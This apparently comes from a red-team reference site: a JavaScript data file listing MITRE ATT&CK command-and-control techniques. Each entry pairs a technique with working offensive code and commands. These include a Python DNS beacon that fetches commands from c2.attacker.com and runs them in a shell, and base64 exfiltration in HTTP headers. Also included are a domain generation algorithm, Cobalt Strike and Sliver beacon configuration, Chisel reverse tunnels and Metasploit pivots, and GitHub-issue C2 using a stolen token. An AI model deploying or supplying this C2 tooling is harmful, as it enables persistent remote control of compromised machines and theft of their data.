export const c2Techniques = [
  {
    id: "T1071",
    name: "Application Layer Protocol",
    summary: "HTTP/S C2 • DNS C2 • SMTP C2 • WebSocket",
    description: "Using standard application layer protocols like HTTP, HTTPS, DNS, and SMTP for C2 communication to blend in with legitimate traffic.",
    tags: ["T1071", "HTTP C2", "DNS C2", "HTTPS beacon", "application protocol"],
    steps: [
      { type: "comment", content: "# T1071.001 - HTTP/S C2 with Cobalt Strike / Sliver" },
      { type: "cmd", content: "# Cobalt Strike profile for HTTP C2:\n# Set user-agent, headers, URI paths to mimic legitimate traffic" },
      { type: "comment", content: "# T1071.004 - DNS C2 beacon" },
      { type: "cmd", content: "# Configure C2 domain with DNS record delegation\n# Sliver DNS C2 listener:\nsliver > dns --domains c2.yourdomain.com" },
      { type: "comment", content: "# DNS C2 command channel" },
      { type: "code", content: "# Python DNS C2 beacon\nimport dns.resolver, base64, subprocess, time\n\nRESOLVER = '8.8.8.8'\nDOMAIN = 'c2.attacker.com'\n\nwhile True:\n    # Query for commands\n    result = dns.resolver.resolve(f'cmd.{DOMAIN}', 'TXT')\n    cmd = base64.b64decode(str(result[0]).strip('\"')).decode()\n    out = subprocess.check_output(cmd, shell=True)\n    # Exfil via DNS TXT record lookup\n    time.sleep(60)" },
    ]
  },
  {
    id: "T1092",
    name: "Communication Through Removable Media",
    summary: "USB C2 • air-gap bridge • offline comms",
    description: "Communicating with malware on air-gapped systems via removable media acting as a data bridge.",
    tags: ["T1092", "USB C2", "air-gap", "removable media"],
    steps: [
      { type: "comment", content: "# Write commands to USB, executed by implant on air-gapped system" },
      { type: "code", content: "# Operator side - write commands to USB trigger file\nwith open('D:\\cmd.enc', 'wb') as f:\n    f.write(xor_encrypt(b'whoami', KEY))\n# Air-gapped implant side:\n# Monitor removable media for trigger files\n# Execute commands, write results back to USB" },
    ]
  },
  {
    id: "T1132",
    name: "Data Encoding",
    summary: "base64 • XOR • custom encoding",
    description: "Encoding C2 communications to make them look benign and evade detection by network security tools.",
    tags: ["T1132", "base64", "XOR", "encoding", "obfuscation"],
    steps: [
      { type: "comment", content: "# T1132.001 - Base64 encode C2 traffic" },
      { type: "code", content: "import base64, requests\n\ndef send_data(data):\n    encoded = base64.b64encode(data.encode()).decode()\n    # Send encoded data in HTTP header to blend in\n    requests.get('https://c2.domain.com/', headers={'X-Session-ID': encoded})\n\ndef get_command():\n    r = requests.get('https://c2.domain.com/update')\n    return base64.b64decode(r.headers.get('X-Content', '')).decode()" },
    ]
  },
  {
    id: "T1001",
    name: "Data Obfuscation",
    summary: "steganography • junk data • encoding C2",
    description: "Obfuscating C2 communications by hiding data within legitimate-looking traffic or using steganography.",
    tags: ["T1001", "steganography", "junk data", "C2 obfuscation"],
    steps: [
      { type: "comment", content: "# T1001.002 - Steganography in image C2 traffic" },
      { type: "code", content: "# Hide command in PNG image LSB\nfrom PIL import Image\nimport stepic\n\nimg = Image.open('legit.png')\nimg_with_data = stepic.encode(img, b'RUN: whoami')\nimg_with_data.save('update.png')\n# Implant downloads 'update.png', extracts command from LSB" },
      { type: "comment", content: "# T1001.003 - Junk data to pad C2 packets to fixed size" },
      { type: "code", content: "import os\n# Pad all C2 packets to 4096 bytes with random data\ndef pad_data(data: bytes, size=4096) -> bytes:\n    return data + os.urandom(size - len(data))" },
    ]
  },
  {
    id: "T1568",
    name: "Dynamic Resolution",
    summary: "DGA • fast flux • DNS redirection",
    description: "Using dynamic DNS resolution techniques like domain generation algorithms and fast flux to make C2 infrastructure harder to block.",
    tags: ["T1568", "DGA", "fast flux", "dynamic DNS"],
    steps: [
      { type: "comment", content: "# T1568.002 - Domain Generation Algorithm (DGA)" },
      { type: "code", content: "import datetime, hashlib\n\ndef generate_dga_domains(seed='secret', count=10):\n    domains = []\n    date = datetime.date.today().strftime('%Y%m%d')\n    for i in range(count):\n        h = hashlib.md5(f'{seed}{date}{i}'.encode()).hexdigest()\n        domain = h[:12] + '.com'\n        domains.append(domain)\n    return domains\n\n# Register domains in advance; implant tries all until one responds\ndomains = generate_dga_domains()\nprint(domains)" },
      { type: "comment", content: "# T1568.001 - Fast flux DNS (rotate IPs frequently)" },
      { type: "text", content: "Configure DNS to rotate through multiple IP addresses with very short TTL (60s) to make takedowns difficult." },
    ]
  },
  {
    id: "T1573",
    name: "Encrypted Channel",
    summary: "TLS • custom encryption • HTTPS C2",
    description: "Using encryption to protect C2 communications from network monitoring and deep packet inspection.",
    tags: ["T1573", "TLS", "HTTPS C2", "encrypted channel"],
    steps: [
      { type: "comment", content: "# T1573.002 - HTTPS C2 with valid TLS certificate" },
      { type: "cmd", content: "# Obtain valid TLS cert via Let's Encrypt:\ncertbot certonly --standalone -d c2.yourdomain.com\n# Configure Cobalt Strike/Sliver with cert for HTTPS listener" },
      { type: "comment", content: "# T1573.001 - Custom symmetric encryption for C2" },
      { type: "code", content: "from Crypto.Cipher import AES\nimport os\n\nKEY = os.urandom(32)  # Pre-shared key\n\ndef encrypt(data: str) -> bytes:\n    cipher = AES.new(KEY, AES.MODE_GCM)\n    ct, tag = cipher.encrypt_and_digest(data.encode())\n    return cipher.nonce + tag + ct\n\ndef decrypt(data: bytes) -> str:\n    nonce, tag, ct = data[:16], data[16:32], data[32:]\n    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)\n    return cipher.decrypt_and_verify(ct, tag).decode()" },
    ]
  },
  {
    id: "T1008",
    name: "Fallback Channels",
    summary: "primary + backup C2 • multi-channel resilience",
    description: "Using multiple C2 channels with fallback mechanisms to maintain connectivity if primary channels are blocked.",
    tags: ["T1008", "fallback C2", "backup channel", "resilience"],
    steps: [
      { type: "comment", content: "# Configure Cobalt Strike with multiple C2 profiles" },
      { type: "code", content: "// Cobalt Strike malleable C2 profile with http-stager\nset sleeptime \"45000\";\nset jitter \"20\";\nhttps-get {\n    set uri \"/wp-content/themes/twenty21/assets/js/\";\n    client {\n        header \"Accept\" \"*/*\";\n        header \"Accept-Language\" \"en-US,en;q=0.5\";\n    }\n}" },
      { type: "comment", content: "# Beacon fallback in Sliver C2" },
      { type: "cmd", content: "sliver > generate beacon --http https://primary-c2.com,https://backup-c2.com --dns c2.yourdomain.com" },
    ]
  },
  {
    id: "T1090",
    name: "Proxy",
    summary: "SOCKS • domain fronting • redirectors",
    description: "Using proxies, redirectors, and domain fronting to obscure the C2 server's true location and bypass network controls.",
    tags: ["T1090", "SOCKS proxy", "domain fronting", "redirectors", "C2 pivot"],
    steps: [
      { type: "comment", content: "# T1090.004 - Domain fronting via CDN (Cloudflare/Fastly)" },
      { type: "text", content: "Configure CDN to forward requests from a trusted domain to your C2 server. Traffic appears to go to CDN but actually reaches attacker infrastructure." },
      { type: "comment", content: "# T1090.002 - External proxy via SOCKS5 over SSH" },
      { type: "cmd", content: "ssh -D 1080 -N -f pivot@compromised-host.com\n# Route C2 traffic through SOCKS5 at localhost:1080" },
      { type: "comment", content: "# T1090.001 - Internal proxy for lateral movement comms" },
      { type: "cmd", content: "# Chisel for TCP tunneling through HTTP:\n# Server (attacker):\nchisel server --port 8080 --reverse\n# Client (victim):\nchisel.exe client attacker:8080 R:socks" },
      { type: "comment", content: "# SOCKS proxy via Metasploit pivot" },
      { type: "cmd", content: "meterpreter > run post/multi/manage/autoroute SUBNET=10.0.0.0 NETMASK=255.255.255.0\nmsf > use auxiliary/server/socks_proxy; set SRVPORT 1080; run" },
    ]
  },
  {
    id: "T1102",
    name: "Web Service",
    summary: "Twitter C2 • GitHub C2 • cloud service C2",
    description: "Using legitimate web services as C2 communication channels to blend in with normal business traffic.",
    tags: ["T1102", "Twitter C2", "GitHub C2", "cloud service", "legitimate web service"],
    steps: [
      { type: "comment", content: "# T1102.002 - GitHub as C2 channel (issues/gists)" },
      { type: "code", content: "import requests\n\n# Beacon reads commands from GitHub issue comments\ntoken = 'ghp_STOLEN_TOKEN'\nrepo = 'attacker/legitimate-looking-repo'\n\ndef get_commands():\n    r = requests.get(f'https://api.github.com/repos/{repo}/issues/1/comments',\n        headers={'Authorization': f'token {token}'})\n    return [c['body'] for c in r.json() if c['user']['login'] == 'operator']" },
      { type: "comment", content: "# T1102.001 - Social media C2 (Twitter DMs)" },
      { type: "code", content: "# Beacon polls Twitter DMs for commands\nimport tweepy\nauth = tweepy.OAuthHandler(API_KEY, API_SECRET)\nauth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)\napi = tweepy.API(auth)\nmessages = api.get_direct_messages()\n# Parse commands from DMs from operator account" },
    ]
  },
];